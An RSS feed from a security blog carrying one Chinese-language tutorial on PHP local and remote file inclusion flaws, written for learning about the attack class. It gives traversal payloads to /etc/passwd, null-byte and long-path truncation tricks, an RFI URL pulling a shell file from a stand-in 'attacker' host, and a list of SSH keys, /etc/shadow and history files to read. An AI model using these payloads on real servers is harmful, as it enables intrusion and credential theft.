<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>php | HumblePoster</title>
    <link>https://p0st3r.github.io/tags/php/</link>
      <atom:link href="https://p0st3r.github.io/tags/php/index.xml" rel="self" type="application/rss+xml" />
    <description>php</description>
    <generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en-us</language><copyright>Lithium©2016</copyright><lastBuildDate>Tue, 11 Apr 2017 00:00:00 +0000</lastBuildDate>
    <image>
      <url>https://p0st3r.github.io/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_2.png</url>
      <title>php</title>
      <link>https://p0st3r.github.io/tags/php/</link>
    </image>
    
    <item>
      <title>PHP文件包含介绍及一些利用方式</title>
      <link>https://p0st3r.github.io/post/php-file-contains/</link>
      <pubDate>Tue, 11 Apr 2017 00:00:00 +0000</pubDate>
      <guid>https://p0st3r.github.io/post/php-file-contains/</guid>
      <description>&lt;h1 id=&#34;文件包含介绍&#34;&gt;文件包含介绍&lt;/h1&gt;
&lt;p&gt;严格来说，文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。&lt;/p&gt;
&lt;p&gt;代码注入的典型代表就是文件包含。文件包含可能会出现在JSP、PHP、ASP等语言中。&lt;/p&gt;
&lt;p&gt;常见的导致文件包含的函数如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP: include(), include_once(), require(),require_once, fopen(), readfile() ….&lt;/li&gt;
&lt;li&gt;JSP/Servlet: ava.io.File(),java.io.FileReader() …&lt;/li&gt;
&lt;li&gt;ASP:include file, include virtual…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PHP文件包含主要由这四个函数完成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;include()&lt;/li&gt;
&lt;li&gt;require()&lt;/li&gt;
&lt;li&gt;include_once()&lt;/li&gt;
&lt;li&gt;require_once()&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当使用这4个函数包含一个新的文件时，&lt;strong&gt;该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型&lt;/strong&gt;。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。&lt;/p&gt;
&lt;p&gt;比如DVWA low等级的文件上传&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($_GET[&lt;span style=&#34;color:#a6e22e&#34;&gt;page&lt;/span&gt;]);&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在同目录留一个包含了可执行的PHP代码的txt文件&lt;/p&gt;
&lt;p&gt;再执行漏洞URL，发现代码被执行了&lt;/p&gt;
&lt;p&gt;要成功的利用文件包含漏洞，需要满足下面两个条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;include（）等函数通过动态变量的方式引入需要包含的文件&lt;/li&gt;
&lt;li&gt;用户能够控制该动态变量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面我们深入看看文件包含漏洞还能导致哪些后果&lt;/p&gt;
&lt;h1 id=&#34;本地文件包含&#34;&gt;本地文件包含&lt;/h1&gt;
&lt;h2 id=&#34;普通本地文件包含&#34;&gt;普通本地文件包含&lt;/h2&gt;
&lt;p&gt;能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion/LFI）。比如下面这段代码就存在LFI漏洞。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_GET&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;‘file’&lt;/span&gt;];      &lt;span style=&#34;color:#75715e&#34;&gt;// “../../etc/passwd\0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;file_exisits&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;home&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wwwrun&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php’&lt;/span&gt;)) {
  &lt;span style=&#34;color:#75715e&#34;&gt;//file_exists will return true as the file/home/wwwrun/../../etc/passwd exists  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;Include&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;home&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wwwrun&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;’&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php’&lt;/span&gt;;
  &lt;span style=&#34;color:#75715e&#34;&gt;// the file /etc/passwd will be included
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用户能够控制参数file。当file的值为../../etc/passwd时，PHP将访问/etc/passwd文件。&lt;/p&gt;
&lt;p&gt;但是在此之前，还需要解决Include‘/home/wwwrun/’.$file.’.php’;&lt;/p&gt;
&lt;p&gt;这种写法将变量与字符串连接起来，假如用户控制$file的值为../../etc/passwd，这段代码相当于Include‘/home/wwwrun/../../etc/passwd.php’;&lt;/p&gt;
&lt;p&gt;被包含的文件实际上是/etc/passwd.php，但是实际上这个文件是不存在的&lt;/p&gt;
&lt;h2 id=&#34;有限制的本地文件包含&#34;&gt;有限制的本地文件包含&lt;/h2&gt;
&lt;h3 id=&#34;00截断&#34;&gt;%00截断&lt;/h3&gt;
&lt;p&gt;PHP内核是由C语言实现的，因此使用了C语言中 的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，只要在最后加入一个0字节，就能截断file变量之后的字符串，即&lt;/p&gt;
&lt;p&gt;../../etc/passwd\0&lt;/p&gt;
&lt;p&gt;在Web输入时只需URL编码一下，变成&lt;/p&gt;
&lt;p&gt;../../etc/passwd%00&lt;/p&gt;
&lt;p&gt;(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)&lt;/p&gt;
&lt;h3 id=&#34;00截断目录遍历&#34;&gt;%00截断目录遍历&lt;/h3&gt;
&lt;p&gt;?file=../../../../../../../../../var/www/%00&lt;/p&gt;
&lt;p&gt;(需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)&lt;/p&gt;
&lt;h3 id=&#34;防御00截断&#34;&gt;防御%00截断&lt;/h3&gt;
&lt;p&gt;在一般的Web应用中，0字节是用户不需要的，因此可以完全禁用0字节，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getVar&lt;/span&gt;($name){
  &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GET&lt;/span&gt;[$name] &lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;; 
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;is_string&lt;/span&gt;($value)){
    &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;“\0”&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;‘&lt;/span&gt; , &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;);  
  }
}
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;构造长目录截断&#34;&gt;构造长目录截断&lt;/h3&gt;
&lt;p&gt;但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;而只需通过【./】就可以构造出足够长的目录。比如&lt;/p&gt;
&lt;p&gt;././././././././././././././././passwd&lt;/p&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;p&gt;////////////////////////passwd&lt;/p&gt;
&lt;p&gt;又或者&lt;/p&gt;
&lt;p&gt;../1/abc/../1/abc/../1/abc..&lt;/p&gt;
&lt;p&gt;(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)&lt;/p&gt;
&lt;h3 id=&#34;点号截断&#34;&gt;点号截断&lt;/h3&gt;
&lt;p&gt;?file=../../../../../../../../../boot.ini/………[…]…………&lt;/p&gt;
&lt;p&gt;(php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)&lt;/p&gt;
&lt;h2 id=&#34;普通远程文件包含&#34;&gt;普通远程文件包含&lt;/h2&gt;
&lt;p&gt;如果PHP的配置选项allow_url_include为ON的话（默认是关闭的），则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（Remote File Inclusion，简称RFI）&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;($route &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;share&amp;#34;&lt;/span&gt;){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;require_once&lt;/span&gt; $basePath &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/action/m_share.php&amp;#39;&lt;/span&gt;;
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;elseif&lt;/span&gt;($route &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sharelink&amp;#34;&lt;/span&gt;){
  &lt;span style=&#34;color:#66d9ef&#34;&gt;require_once&lt;/span&gt; $basePath &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;action/m_sharelink.php&amp;#39;&lt;/span&gt;;}
&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在$basePath前没有设置任何障碍，因此攻击者可以构造类似如下的恶意URL：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;/?param=http://attacker/phpshell.txt?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最终加载的代码实际上执行了：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;require_once &amp;#39;http://attacker/phpshell.txt?/action/m_share.php&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;问号后面的代码最终被解释成URL的querystring（查询用字符串）,这也算一种截断方式，这是利用远程文件包含漏洞时的常见技巧。同样，%00也可以作为截断符号。&lt;/p&gt;
&lt;h2 id=&#34;本地文件包含的利用技巧&#34;&gt;本地文件包含的利用技巧&lt;/h2&gt;
&lt;p&gt;本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件&lt;/p&gt;
&lt;p&gt;经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。&lt;/p&gt;
&lt;p&gt;（1）包含用户上传的文件&lt;/p&gt;
&lt;p&gt;（2）包含data://或php://input等伪协议&lt;/p&gt;
&lt;p&gt;（3）包含session文件&lt;/p&gt;
&lt;p&gt;（4）包含日志文件&lt;/p&gt;
&lt;p&gt;（5）包含/proc/self/environ&lt;/p&gt;
&lt;p&gt;（6）包含上传的临时文件&lt;/p&gt;
&lt;p&gt;（7）包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需具体问题具体分析&lt;/p&gt;
&lt;h3 id=&#34;常见利用方式&#34;&gt;常见利用方式&lt;/h3&gt;
&lt;?phpinclude(&#34;inc/&#34; . $_GET[&#39;file&#39;]); ?&gt;
&lt;ul&gt;
&lt;li&gt;包含同目录下的文件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;?file=.htaccess&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;目录遍历：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;?file=../../../../../../../../../var/lib/locate.db&lt;/p&gt;
&lt;p&gt;?file=../../../../../../../../../var/lib/mlocate/mlocate.db&lt;/p&gt;
&lt;p&gt;（linux中这两个文件储存着所有文件的路径，需要root权限）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包含错误日志：?file=../../../../../../../../../var/log/apache/error.log （试试把UA设置为“”来使payload进入日志）&lt;/li&gt;
&lt;li&gt;获取web目录或者其他配置文件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;?file=../../../../../../../../../usr/local/apache2/conf/httpd.conf&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;包含上传的附件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;?file=../attachment/media/xxx.file&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取session文件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;?file=../../../../../../tmp/sess_tnrdo9ub2tsdurntv0pdir1no7&lt;/p&gt;
&lt;p&gt;（session文件一般在/tmp目录下，格式为sess_[your phpsessid value]，有时候也有可能在/var/lib/php5之类的，在此之前建议先读取配置文件。在某些特定的情况下如果你能够控制session的值，也许你能够获得一个shell）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果拥有root权限还可以试试读这些东西：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;/root/.ssh/authorized_keys&lt;/p&gt;
&lt;p&gt;/root/.ssh/id_rsa&lt;/p&gt;
&lt;p&gt;/root/.ssh/id_rsa.keystore&lt;/p&gt;
&lt;p&gt;/root/.ssh/id_rsa.pub&lt;/p&gt;
&lt;p&gt;/root/.ssh/known_hosts&lt;/p&gt;
&lt;p&gt;/etc/shadow&lt;/p&gt;
&lt;p&gt;/root/.bash_history&lt;/p&gt;
&lt;p&gt;/root/.mysql_history&lt;/p&gt;
&lt;p&gt;/proc/self/fd/fd[0-9]* (文件标识符)&lt;/p&gt;
&lt;p&gt;/proc/mounts&lt;/p&gt;
&lt;p&gt;/proc/config.gz&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果有phpinfo可以包含临时文件：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;参考：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[1]《白帽子讲Web安全》，吴翰清&lt;/p&gt;
&lt;p&gt;[2]
&lt;a href=&#34;https://link.zhihu.com/?target=http%3A//blog.csdn.net/wangjian1012/article/details/51581440&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PHP文件包含漏洞总结 - wangjian1012的博客 - 博客频道 - CSDN.NET&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>
